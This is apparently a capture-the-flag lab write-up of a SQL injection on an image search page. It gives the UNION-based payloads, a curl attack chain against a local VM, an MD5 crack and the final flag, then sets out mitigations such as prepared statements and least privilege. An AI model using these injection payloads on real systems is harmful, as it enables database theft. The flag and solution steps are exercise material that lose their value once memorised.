# Breach #3: SQL Injection on Image Search

## Vulnerability Type
**SQL Injection (SQLi) - Image Search Engine**
- OWASP: A03:2021 - Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

## How We Found It

### Discovery: Image Search Page
URL: `http://192.168.64.2/index.php?page=searchimg`

This page allows searching for images by their ID through a search form.

### Step 1: Normal Query Test
First, we tested the legitimate functionality by searching for image ID `1`:

**Input**:
```sql
1
```

![Normal image search with ID 1](images/01-normal-search.png)

**Output**:
```
ID: 1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```

The application returns the image title and URL.

### Step 2: SQL Injection Vulnerability Test
We tested for SQL Injection using the same technique as Breach #2:

**Input**:
```sql
1 OR 1=1
```

**Expected SQL Query on Server**:
```sql
SELECT title, url FROM list_images WHERE id = 1 OR 1=1
```

![SQL Injection with OR TRUE condition](images/02-sql-injection-true.png)

**Result**: All image records were returned!

**Output**:
```
ID: 1 OR 1=1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR 1=1
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR 1=1
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR 1=1
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR 1=1
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

✅ **SQL Injection confirmed!** Image ID 5 "Hack me ?" looks suspicious.

### Step 3: Database Structure Enumeration
Using the same technique from Breach #2, we can enumerate the database structure:

**Input**:
```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

**Discovered `list_images` table columns**:
- `id` - Image ID
- `url` - Image URL
- `title` - Image title
- `comment` - Image comment (metadata)

### Step 4: Extract Hidden Comment
We noticed image ID 5 has the title "Hack me ?", suggesting hidden information in the `comment` field:

**Input**:
```sql
5 UNION SELECT title, comment FROM list_images WHERE id=5
```

![Extracting comment field from image 5](images/03-union-comment-extraction.png)

**Result**:
```
Title: Hack me ?
Url : borntosec.ddns.net/images.png

Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

**Instructions found in comment**:
1. Decode MD5 hash: `1928e8083cf461a51303633093573c46`
2. Convert to lowercase
3. Apply SHA256 hashing

### Step 5: Crack MD5 Hash
Using [CrackStation.net](https://crackstation.net/):

![MD5 hash cracking](images/04-md5-crack.png)

**Hash**: `1928e8083cf461a51303633093573c46`
**Plaintext**: `Albatroz`

### Step 6: Generate Flag
Following the instructions:

1. **Decrypt**: `1928e8083cf461a51303633093573c46` → `Albatroz`
2. **Lowercase**: `Albatroz` → `albatroz`
3. **SHA256 hash**:

```bash
echo -n "albatroz" | shasum -a 256
```

![SHA256 hash generation](images/05-sha256-flag.png)

**Result**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

✅ **Flag obtained!**

## How to Exploit

### Complete Attack Chain

```bash
# 1. Test for SQL injection vulnerability
curl "http://192.168.64.2/index.php?page=searchimg&id=1+OR+1%3D1&Submit=Submit"

# 2. Enumerate database structure
curl "http://192.168.64.2/index.php?page=searchimg&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit"

# 3. Extract all images with all columns using CONCAT
curl "http://192.168.64.2/index.php?page=searchimg&id=-1+UNION+SELECT+1%2C+CONCAT(id%2C+url%2C+title%2C+comment)+FROM+list_images&Submit=Submit"

# 4. Extract specific comment from image 5
curl "http://192.168.64.2/index.php?page=searchimg&id=5+UNION+SELECT+title%2C+comment+FROM+list_images+WHERE+id%3D5&Submit=Submit"

# 5. Crack MD5 hash
# Visit: https://crackstation.net/
# Input: 1928e8083cf461a51303633093573c46
# Output: Albatroz

# 6. Generate SHA256 flag
echo -n "albatroz" | shasum -a 256
# Output: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

### Alternative: Extract All Data with CONCAT

```sql
-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```

This concatenates all columns into a single output field, revealing all hidden data at once.

## Security Issues

### 1. No Input Validation
**Problem**: User input is directly inserted into SQL queries without sanitization.

**Vulnerable Code** (hypothetical):
```php
$id = $_GET['id'];
$query = "SELECT title, url FROM list_images WHERE id = $id";
$result = mysqli_query($conn, $query);
```

### 2. Sensitive Data in Database Comments
**Problem**: The flag instructions and MD5 hash are stored in a publicly accessible `comment` field.

**Why it's dangerous**:
- Comments should be for display purposes, not storing sensitive data
- Any SQL injection gives immediate access to this data
- No encryption or access control on comment field

**Bad Practice**:
```sql
INSERT INTO list_images (id, title, url, comment)
VALUES (5, 'Hack me ?', 'borntosec.ddns.net/images.png',
'If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46');
```

### 3. Same Vulnerability Pattern as Members Page
**Problem**: This is the **exact same SQL injection vulnerability** as Breach #2, just on a different page.

**Why it matters**:
- Shows **systematic security failure** across the application
- Developers copied vulnerable code to multiple pages
- Indicates lack of secure coding practices and code review

### 4. Information Disclosure through Enumeration
**Problem**: Attackers can enumerate all images and their metadata:
- Image IDs
- URLs (may reveal internal infrastructure)
- Titles and comments (may contain sensitive info)

## Mitigation

### 1. Use Prepared Statements (Critical!)

**✅ Secure Code** (PHP with PDO):
```php
$id = $_GET['id'];
$stmt = $pdo->prepare("SELECT title, url FROM list_images WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

**✅ Secure Code** (Node.js with MySQL):
```javascript
const id = req.query.id;
connection.query(
  'SELECT title, url FROM list_images WHERE id = ?',
  [id],
  function(err, rows, fields) {
    // Handle results
  }
);
```

### 2. Never Store Sensitive Data in Publicly Accessible Fields

**❌ Bad**:
```sql
-- Storing sensitive instructions in comment field
INSERT INTO list_images (title, comment)
VALUES ('Hack me ?', 'Secret flag instructions: ...');
```

**✅ Good**:
```sql
-- Use separate, restricted table for sensitive data
CREATE TABLE admin_notes (
  id INT,
  note TEXT,
  access_level ENUM('admin', 'developer') DEFAULT 'admin'
);

-- Apply strict access controls
GRANT SELECT ON myapp.list_images TO 'webapp'@'localhost';
REVOKE ALL ON myapp.admin_notes FROM 'webapp'@'localhost';
```

### 3. Input Validation

**Type validation**:
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die("Invalid image ID");
}
```

**Whitelist validation**:
```php
// Only allow numeric IDs
if (!preg_match('/^[0-9]+$/', $_GET['id'])) {
    http_response_code(400);
    die("Invalid input");
}
```

### 4. Implement Code Reusability Best Practices

**Problem**: Vulnerable code was copied across multiple pages.

**Solution**: Create secure, reusable database query functions:

```php
// secure_db_helper.php
class SecureDB {
    private $pdo;

    public function __construct($pdo) {
        $this->pdo = $pdo;
    }

    public function getImageById($id) {
        // Validation
        $id = filter_var($id, FILTER_VALIDATE_INT);
        if ($id === false || $id < 1) {
            throw new InvalidArgumentException("Invalid ID");
        }

        // Prepared statement
        $stmt = $this->pdo->prepare(
            "SELECT title, url FROM list_images WHERE id = ?"
        );
        $stmt->execute([$id]);

        return $stmt->fetch();
    }
}

// Usage in multiple pages
$db = new SecureDB($pdo);
$image = $db->getImageById($_GET['id']);
```

**Benefits**:
- Security fix applies to all pages automatically
- Consistent validation and error handling
- Easier to maintain and audit
- Single point of security enforcement

### 5. Principle of Least Privilege

**Database permissions**:
```sql
-- Create limited user for image search
CREATE USER 'image_search'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only SELECT on list_images
GRANT SELECT (id, title, url) ON myapp.list_images TO 'image_search'@'localhost';

-- Explicitly deny access to comment column
-- (Or don't grant access to it in the first place)

FLUSH PRIVILEGES;
```

**Why this helps**:
- Even if SQL injection occurs, attacker can't access `comment` field
- Limits damage from successful attacks
- Defense in depth strategy

### 6. Content Security Policy (CSP)

**Prevent data exfiltration**:
```apache
# Apache configuration
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

This limits where data can be sent, making it harder for attackers to exfiltrate stolen data.

### 7. Rate Limiting

**Prevent automated SQL injection attacks**:
```nginx
# Nginx configuration
limit_req_zone $binary_remote_addr zone=searchimg:10m rate=10r/m;

location /index.php {
    if ($arg_page = "searchimg") {
        limit_req zone=searchimg burst=5 nodelay;
    }
}
```

## Impact Assessment

### CVSS 3.1 Score: 9.8 (Critical)

**Attack Vector**: Network (AV:N)
**Attack Complexity**: Low (AC:L)
**Privileges Required**: None (PR:N)
**User Interaction**: None (UI:N)
**Scope**: Changed (S:C)
**Confidentiality**: High (C:H)
**Integrity**: High (I:H)
**Availability**: High (A:H)

### Comparison with Breach #2

| Aspect | Members Search (Breach #2) | Image Search (Breach #3) |
|--------|----------------------------|---------------------------|
| **Vulnerability** | SQL Injection | SQL Injection |
| **Affected Table** | `users` | `list_images` |
| **Data Exposed** | User credentials | Image metadata + hidden instructions |
| **Severity** | Critical | Critical |
| **Root Cause** | No input validation | **Same vulnerability copied** |

**Key Insight**: This is a **systemic problem**, not an isolated incident. The same vulnerable code pattern was replicated across the application.

## Lessons Learned

### 1. Code Reuse Done Wrong
**Problem**: Vulnerable code was copied to multiple pages without security review.

**Solution**:
- Use secure helper functions/libraries
- Implement mandatory code review
- Use static analysis tools to detect SQL injection

### 2. Data Classification Failure
**Problem**: Sensitive flag instructions stored in publicly accessible database field.

**Solution**:
- Classify data by sensitivity (Public, Internal, Confidential, Secret)
- Store sensitive data in separate, restricted tables
- Apply appropriate access controls

### 3. Lack of Defense in Depth
**Problem**: No secondary security measures if SQL injection occurs.

**Solution**:
- Database user permissions (least privilege)
- Web Application Firewall (WAF)
- Intrusion Detection System (IDS)
- Regular security audits

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## Tools Used

- **Browser**: Manual testing
- **curl**: Command-line testing
- **CrackStation**: MD5 hash cracking
- **shasum**: SHA256 hash generation

---
**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
